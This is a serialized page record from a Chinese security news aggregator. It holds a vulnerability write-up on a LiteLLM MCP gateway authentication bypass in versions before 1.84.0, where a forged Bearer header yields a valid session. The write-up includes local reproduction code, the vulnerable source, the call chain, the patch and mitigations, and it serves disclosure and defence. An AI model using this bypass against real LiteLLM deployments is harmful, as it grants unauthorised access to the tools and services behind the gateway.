[{"_1":2,"_3":4},"root",{"_5":156},"routes/item",{"_5":6},"data",{"_7":8,"_9":10},"item",{"_11":12,"_13":14,"_15":16,"_17":18,"_19":20,"_21":22,"_23":24,"_25":26,"_27":28,"_29":28,"_30":31,"_32":33,"_34":35,"_36":37,"_38":39,"_40":41,"_42":-5,"_43":44,"_45":-5,"_46":47,"_48":49,"_50":51,"_52":53,"_54":37,"_55":37,"_56":57,"_58":59,"_60":61},"expiresAt",1795740045000,"id","r4z5g7d91a99mhhnox3pfjud6","title","LiteLLM MCP OAuth2 passthrough 认证绕过复现与分析","originalTitle","一个伪造 Bearer 拿下 MCP 会话：LiteLLM MCP OAuth2 passthrough 认证绕过复现与分析","summary","LiteLLM 1.84.0 之前存在 MCP OAuth2 passthrough 认证绕过，未认证攻击者携带任意 Authorization: Bearer 头且不带 x-litellm-api-key，即可获得有效会话并列举、调用网关聚合的 MCP 工具。","reason","文章用可复现代码对比 1.83.6 与 1.84.0，并追踪认证失败被降级为有效会话的调用链，适合排查同类鉴权兜底设计。","source",{"_73":155},"links",{"_148":154},"publishedAt","2026-11-16T08:57:02.000Z","discoveredAt","2026-11-17T09:13:34.210Z","timelineAt","category","disclosure","tags",[76,151,152,74,153],"score",72,"selected",true,"channel","news","story",{"_80":81,"_13":82},"x","readingMode","full","author","body",{"_61":147,"_148":-5,"_149":148,"_150":37},"outline",[83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102],"relatedStories",[79],"topics",[68,69,70],"indexable","markdownAvailable","group",{"_62":63,"_64":65,"_66":67},"hasTranslation",false,"bodyLanguage","zh","factId","fBsJobsNy5Zc","reportCount",1,"additionalSourceCount",0,{"_71":77,"_73":78},{"_71":75,"_73":76},{"_71":72,"_73":74},"slug","ai-security","name","AI 安全","research","技术研究","vuln","漏洞披露",{"_80":81,"_13":82},"publicId","0fa4ea0a-b5b0-4272-b919-3c56b61b5a71","LiteLLM MCP认证绕过被复现",{"_11":145,"_104":146,"_106":107},{"_11":143,"_104":144,"_106":107},{"_11":141,"_104":142,"_106":107},{"_11":139,"_104":140,"_106":107},{"_11":137,"_104":138,"_106":107},{"_11":135,"_104":136,"_106":107},{"_11":133,"_104":134,"_106":107},{"_11":131,"_104":132,"_106":110},{"_11":129,"_104":130,"_106":110},{"_11":127,"_104":128,"_106":107},{"_11":125,"_104":126,"_106":110},{"_11":123,"_104":124,"_106":110},{"_11":121,"_104":122,"_106":110},{"_11":119,"_104":120,"_106":110},{"_11":117,"_104":118,"_106":110},{"_11":115,"_104":116,"_106":110},{"_11":113,"_104":114,"_106":107},{"_11":111,"_104":112,"_106":110},{"_11":108,"_104":109,"_106":110},{"_11":103,"_104":105,"_106":107},"sec-20","text","参考","level",2,"sec-19","2、临时缓解",3,"sec-18","1、安全更新","sec-17","九、修复措施","sec-16","6、拓展","sec-15","5、修复","sec-14","4、调用链","sec-13","3、根因","sec-12","2、绕过点","sec-11","1、鉴权分发逻辑","sec-10","八、漏洞分析","sec-9","2、修复版 1.84.0","sec-8","1、漏洞版 1.83.6","sec-7","七、漏洞复现","sec-6","六、环境搭建","sec-5","五、利用条件","sec-4","四、影响组件","sec-3","三、受影响版本","sec-2","二、基本信息","sec-1","一、漏洞说明","<p>LiteLLM 是用得很广的 LLM 网关/代理，它的 MCP 网关能把一堆后端 MCP 工具聚合起来、统一鉴权后再暴露给客户端。今年 6 月它披露了一个 MCP 认证绕过：一个<strong>未认证</strong>的攻击者，只要在请求里带一个<strong>随便编的</strong> <code>Authorization: Bearer xxx</code>，就能建立一个\"已认证\"的 MCP 会话，去列举和调用网关后面配置的 MCP 工具。</p><p>根因很简单——为了支持\"把 OAuth2 token 透传给上游 MCP 服务器\"，鉴权处理在 LiteLLM key 校验失败时，没有拒绝，反而返回了一个<strong>空的、但有效的</strong> <code>UserAPIKeyAuth()</code>。</p><h2 id=\"sec-1\">一、漏洞说明</h2><p>Advisory：<a href=\"https://github.com/BerriAI/litellm/security/advisories/GHSA-7488-6r32-c95q\">https://github.com/BerriAI/litellm/security/advisories/GHSA-7488-6r32-c95q</a></p><p>LiteLLM 的 MCP Streamable HTTP 端点在处理鉴权时，支持\"OAuth2 透传\"：当请求带 <code>Authorization</code> 头、但不是合法 LiteLLM key 时，本意是把它当作要转发给上游 OAuth2 MCP 服务器的 token。问题在于它的兜底逻辑——LiteLLM key 校验抛出 401/403 后，<code>except</code> 把异常吞掉，转而把鉴权结果设成一个空的 <code>UserAPIKeyAuth()</code>。这个空对象在下游被当作一个合法的、已认证的会话。于是任何人带一个伪造的 Bearer 就能通过鉴权，拿到对 MCP 工具的访问权，进而触达网关后面连接的各类服务。</p><h2 id=\"sec-2\">二、基本信息</h2><table><tbody><tr><td colspan=\"1\" rowspan=\"1\"><p>公开时间</p></td><td colspan=\"1\" rowspan=\"1\"><p>2026-06-30</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>编号</p></td><td colspan=\"1\" rowspan=\"1\"><p>GHSA-7488-6r32-c95q</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>威胁类型</p></td><td colspan=\"1\" rowspan=\"1\"><p>认证绕过（OAuth2 passthrough fallback）</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>CVSS 3.1</p></td><td colspan=\"1\" rowspan=\"1\"><p>8.8（High）</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>利用条件</p></td><td colspan=\"1\" rowspan=\"1\"><p>无需有效凭据，带任意 <code>Authorization: Bearer</code> 头即可</p></td></tr><tr><td colspan=\"1\" rowspan=\"1\"><p>修复 commit</p></td><td colspan=\"1\" rowspan=\"1\"><p><code>73869f0</code>（<a href=\"https://github.com/BerriAI/litellm/pull/26463\">#26463</a>）</p></td></tr></tbody></table><h2 id=\"sec-3\">三、受影响版本</h2><p><code>litellm &lt; 1.84.0</code>，修复于 <code>1.84.0</code>。</p><h2 id=\"sec-4\">四、影响组件</h2><p>LiteLLM 是一个把各家大模型 API 统一成 OpenAI 协议的网关/代理，广泛部署在 LLM 应用后端。它的 MCP 网关（<code>/mcp/</code> 系列端点）把多个后端 MCP 服务器聚合起来，由 LiteLLM 统一做鉴权与访问控制，再暴露给 MCP 客户端（通常是大模型 / Agent）。这类\"统一鉴权入口\"一旦被绕过，影响的是它身后所有被聚合的工具与服务。</p><h2 id=\"sec-5\">五、利用条件</h2><ol><li><p>部署启用了 LiteLLM 的 MCP 网关端点（<code>/mcp/</code>）；</p></li><li><p>版本 <code>&lt; 1.84.0</code>；</p></li><li><p>攻击者能访问到 MCP 端点；</p></li><li><p>请求带一个 <code>Authorization</code> 头、但<strong>不带</strong> <code>x-litellm-api-key</code>——token 内容随便填。</p></li></ol><h2 id=\"sec-6\">六、环境搭建</h2><p>两个隔离 venv 装漏洞版与修复版（都带 proxy 依赖）：</p><pre><code>python3 -m venv .venv-vuln\n. .venv-vuln/bin/activate &amp;&amp; pip install \"litellm[proxy]==1.83.6\" &amp;&amp; deactivate\n\npython3 -m venv .venv-fixed\n. .venv-fixed/bin/activate &amp;&amp; pip install \"litellm[proxy]==1.84.0\" &amp;&amp; deactivate</code></pre><p>复现直接调用<strong>真实</strong>的鉴权方法 <code>MCPRequestHandler.process_mcp_request()</code>。唯一修改的是它依赖的<br><code>user_api_key_auth</code>——把它换成\"对无效 key 抛 HTTP 401\"，这正是该函数对伪造 LiteLLM key 的行为，<br>这样就不必为复现去搭一整套带数据库的 proxy，而漏洞所在的方法本身是原样的代码：</p><pre><code>import asyncio, litellm\nfrom litellm.proxy._experimental.mcp_server.auth import user_api_key_auth_mcp as m\nfrom litellm.proxy._types import UserAPIKeyAuth\nfrom fastapi import HTTPException\n\nasync def reject_invalid_key(*a, **k):      # 真实 user_api_key_auth 对伪造 key 的行为\n    raise HTTPException(status_code=401, detail=\"Invalid proxy server token passed\")\nm.user_api_key_auth = reject_invalid_key\n\ndef scope(bearer):                           # 最小 ASGI 请求：只带攻击者可控的 Authorization 头\n    return {\"type\": \"http\", \"method\": \"POST\", \"path\": \"/mcp/\", \"query_string\": b\"\",\n            \"headers\": [(b\"authorization\", bearer.encode())]}\n\nasync def main():\n    result = await m.MCPRequestHandler.process_mcp_request(scope(\"Bearer totally-fake-attacker-token\"))\n    auth: UserAPIKeyAuth = result[0]\n    print(\"返回:\", type(auth).__name__, \"| api_key =\", repr(auth.api_key), \"| user_role =\", auth.user_role)\n\nasyncio.run(main())</code></pre><h2 id=\"sec-7\">七、漏洞复现</h2><h3 id=\"sec-8\">1、漏洞版 1.83.6</h3><p>运行上面的代码</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261116170615-fa424adb-e19c-1.png&amp;mode=full&amp;exp=1795996800&amp;sig=140db6584e77c9d9\" loading=\"lazy\" decoding=\"async\" width=\"504\"></p><p>伪造的 Bearer 没有被拒绝，<code>process_mcp_request</code> 返回了一个 <code>UserAPIKeyAuth</code>——一个合法的、已认证的会话上下文（<code>api_key=None</code> 只是说明它是匿名兜底出来的，但在下游一样被当作\"已通过鉴权\"）。</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261116170615-fa812efa-e19c-1.png&amp;mode=full&amp;exp=1795996800&amp;sig=e490276e042f3922\" loading=\"lazy\" decoding=\"async\" width=\"797.3333333333334\"></p><h3 id=\"sec-9\">2、修复版 1.84.0</h3><p>使用1.84.0版本的运行</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261116170616-fac67b0b-e19c-1.png&amp;mode=full&amp;exp=1795996800&amp;sig=65d7a75111da9dfc\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261116170616-fac67b0b-e19c-1.png&amp;mode=thumb&amp;exp=1795996800&amp;sig=322b58ecdac06e44 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261116170616-fac67b0b-e19c-1.png&amp;mode=image-1200&amp;exp=1795996800&amp;sig=d49d5c923b828bd5 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261116170616-fac67b0b-e19c-1.png&amp;mode=full&amp;exp=1795996800&amp;sig=65d7a75111da9dfc 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1074\"></p><p>同一攻击在修复版里被 401 拒绝。</p><h2 id=\"sec-10\">八、漏洞分析</h2><h3 id=\"sec-11\">1、鉴权分发逻辑</h3><p><code>litellm/proxy/_experimental/mcp_server/auth/user_api_key_auth_mcp.py</code> 的 <code>process_mcp_request()</code>，按请求头选择怎么鉴权（1.83.6）：</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261116170616-fb2591fd-e19c-1.png&amp;mode=full&amp;exp=1795996800&amp;sig=e308943528bbd00a\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261116170616-fb2591fd-e19c-1.png&amp;mode=thumb&amp;exp=1795996800&amp;sig=d481f1c8fa24af11 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261116170616-fb2591fd-e19c-1.png&amp;mode=image-1200&amp;exp=1795996800&amp;sig=584965e7aa2a69ab 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261116170616-fb2591fd-e19c-1.png&amp;mode=full&amp;exp=1795996800&amp;sig=e308943528bbd00a 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1706\"></p><pre><code>120        if \".well-known\" in str(request.url):   # public routes\n121            validated_user_api_key_auth = UserAPIKeyAuth()\n122        elif has_explicit_litellm_key:\n123            # 显式 x-litellm-api-key：正常校验\n124            validated_user_api_key_auth = await user_api_key_auth(\n125                api_key=litellm_api_key, request=request)\n127        elif oauth2_headers:\n128            # 没有 x-litellm-api-key，但有 Authorization 头：\n129            # 可能是 LiteLLM key（向后兼容），也可能是要透传给上游 MCP 的 OAuth2 token\n132            try:\n133                validated_user_api_key_auth = await user_api_key_auth(\n134                    api_key=litellm_api_key, request=request)\n136            except HTTPException as e:\n137                if e.status_code in (401, 403):\n142                    validated_user_api_key_auth = UserAPIKeyAuth()   # ← 认证失败却给了有效会话\n143                else:\n144                    raise\n145            except ProxyException as e:\n146                if str(e.code) in (\"401\", \"403\"):\n151                    validated_user_api_key_auth = UserAPIKeyAuth()   # ← 同上\n152                else:\n153                    raise\n154        else:\n155            validated_user_api_key_auth = await user_api_key_auth(\n156                api_key=litellm_api_key, request=request)</code></pre><h3 id=\"sec-12\">2、绕过点</h3><p>攻击者带 <code>Authorization: Bearer &lt;任意&gt;</code>、不带 <code>x-litellm-api-key</code>，于是：</p><pre><code>has_explicit_litellm_key = False     （没有 x-litellm-api-key）\noauth2_headers = {\"Authorization\": \"...\"}   （有 Authorization 头 -&gt; 进入 elif oauth2_headers 分支）\n  -&gt; user_api_key_auth(伪造 key)  抛 HTTPException(401)\n  -&gt; except 捕获，status 是 401\n  -&gt; validated_user_api_key_auth = UserAPIKeyAuth()   （第 142 行）\n  -&gt; 返回这个空会话，鉴权\"通过\"</code></pre><p>对比第 154 行的 <code>else</code> 分支（没有任何鉴权头时）：它同样调 <code>user_api_key_auth</code>，但<strong>不</strong>捕获异常——校验失败就如实抛出、拒绝请求。也就是说，<strong>带一个伪造 Bearer 反而比什么都不带更容易过</strong>：异常被 <code>except</code> 吞成了匿名会话。</p><h3 id=\"sec-13\">3、根因</h3><p>一句话：<strong>OAuth2 透传的兜底逻辑把\"LiteLLM key 校验失败（401/403）\"无条件翻译成了\"匿名但有效的会话\"（</strong><code>UserAPIKeyAuth()</code><strong>），而没有先确认这次请求确实指向一个配置了 OAuth2 透传的上游服务器。</strong> 认证失败的正确处理是拒绝，这里却成了放行。</p><h3 id=\"sec-14\">4、调用链</h3><pre><code>攻击者请求  Authorization: Bearer &lt;garbage&gt;  (无 x-litellm-api-key)\n  -&gt; MCPRequestHandler.process_mcp_request(scope)\n     -&gt; elif oauth2_headers:\n        -&gt; user_api_key_auth(伪造 key)  -&gt; raise HTTPException(401)\n        -&gt; except HTTPException: status==401\n           -&gt; validated_user_api_key_auth = UserAPIKeyAuth()   # 认证绕过\n  -&gt; 返回有效会话 -&gt; 可列举/调用 MCP 工具</code></pre><h3 id=\"sec-15\">5、修复</h3><p>1.84.0 把兜底收紧：只有当请求<strong>确实指向一个 operator 配置了 </strong><code>auth_type=oauth2</code><strong> 的上游服务器</strong>时，401/403 才回退匿名透传；其它情况下校验失败照常抛出。对应提交是 <code>73869f0</code>（<a href=\"https://github.com/BerriAI/litellm/pull/26463\">#26463</a>，<em>tighten public-route detection and OAuth2 fallback gating</em>），<code>v1.84.0</code> 包含它。源码里的注释把动机写得很明白——否则攻击者就能\"拿任意垃圾 bearer 换一个匿名会话\"：</p><p><img src=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261116170617-fb86f94a-e19c-1.png&amp;mode=full&amp;exp=1795996800&amp;sig=60312f63e3b6148e\" srcset=\"/api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261116170617-fb86f94a-e19c-1.png&amp;mode=thumb&amp;exp=1795996800&amp;sig=5ba952a0255e5a0f 720w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261116170617-fb86f94a-e19c-1.png&amp;mode=image-1200&amp;exp=1795996800&amp;sig=9b770cf3c211dc47 1200w, /api/img-proxy?u=https%3A%2F%2Fxzfile.aliyuncs.com%2Fmedia%2Fupload%2Fpicture%2F20261116170617-fb86f94a-e19c-1.png&amp;mode=full&amp;exp=1795996800&amp;sig=60312f63e3b6148e 1600w\" sizes=\"(min-width: 1536px) 760px, (min-width: 1024px) calc(100vw - 524px), (min-width: 640px) 608px, calc(100vw - 32px)\" loading=\"lazy\" decoding=\"async\" width=\"1706\"></p><pre><code>except (HTTPException, ProxyException) as e:\n    status = e.status_code if isinstance(e, HTTPException) else e.code\n    if status in (401, 403, \"401\", \"403\") and \\\n            MCPRequestHandler._target_servers_use_oauth2(\n                path=request.url.path, mcp_servers=mcp_servers):\n        ...  # 仅此时才回退匿名透传\n    else:\n        raise          # 否则认证失败照常拒绝</code></pre><p>顺带一提，同一版本还把开头那行公共路由判断从 <code>\".well-known\" in str(request.url)</code>（子串匹配，能被 query/host 走私）改成了 <code>request.url.path.startswith(\"/.well-known/\")</code>（只看 path、前缀精确匹配）——也是一处\"看似无害的宽松判断\"。</p><h3 id=\"sec-16\">6、拓展</h3><p>这类\"认证失败兜底成匿名会话\"的反模式，追究到底在于把两件事混在了一个 <code>except</code> 里：一是\"这个 token 不是我的 key\"（正常，可能要走透传），二是\"这次请求该不该被放行\"。正确的做法是先确定请求的目标与策略，再决定校验失败意味着什么——而不是一律降级放行。审计鉴权中间件时，凡是 <code>except ... : &lt;设为已认证/空凭据对象&gt;</code> 的写法都要注意：认证的失败分支默认应该是拒绝。</p><h2 id=\"sec-17\">九、修复措施</h2><h3 id=\"sec-18\">1、安全更新</h3><p>升级到 <code>litellm &gt;= 1.84.0</code>：</p><pre><code>pip install -U \"litellm[proxy]&gt;=1.84.0\"</code></pre><h3 id=\"sec-19\">2、临时缓解</h3><ol><li><p>若暂时无法升级，在反向代理 / API 网关层拦掉 <code>/mcp/</code> 及相关 MCP 端点的外部访问；</p></li><li><p>只对确有 OAuth2 透传需求的上游服务器开启该能力，其余 MCP 服务器用显式 key/bearer 鉴权；</p></li><li><p>给 MCP 端点加独立的网络访问控制，别让未认证流量直达。</p></li></ol><h2 id=\"sec-20\">参考</h2><ul><li><p>GitHub Advisory（GHSA-7488-6r32-c95q）：<a href=\"https://github.com/BerriAI/litellm/security/advisories/GHSA-7488-6r32-c95q\">https://github.com/BerriAI/litellm/security/advisories/GHSA-7488-6r32-c95q</a></p></li><li><p>修复 commit：<a href=\"https://github.com/BerriAI/litellm/commit/73869f0faf7d11ee21adcb5f91b8c33a340b6c2c\">https://github.com/BerriAI/litellm/commit/73869f0faf7d11ee21adcb5f91b8c33a340b6c2c</a></p></li><li><p>修复 PR #26463：<a href=\"https://github.com/BerriAI/litellm/pull/26463\">https://github.com/BerriAI/litellm/pull/26463</a></p></li><li><p>项目仓库：<a href=\"https://github.com/BerriAI/litellm\">https://github.com/BerriAI/litellm</a></p></li><li><p>修复版本 v1.84.0：<a href=\"https://github.com/BerriAI/litellm/releases/tag/v1.84.0\">https://github.com/BerriAI/litellm/releases/tag/v1.84.0</a></p></li><li><p>MCP 协议：<a href=\"https://modelcontextprotocol.io/\">https://modelcontextprotocol.io/</a></p></li></ul>","original","zhKind","complete","复现","漏洞分析","Agent 安全","https://xz.aliyun.com/news/93346","先知社区",{"_157":158,"_159":-5},"changelogVersion","2026-10-01T08:00","release"]
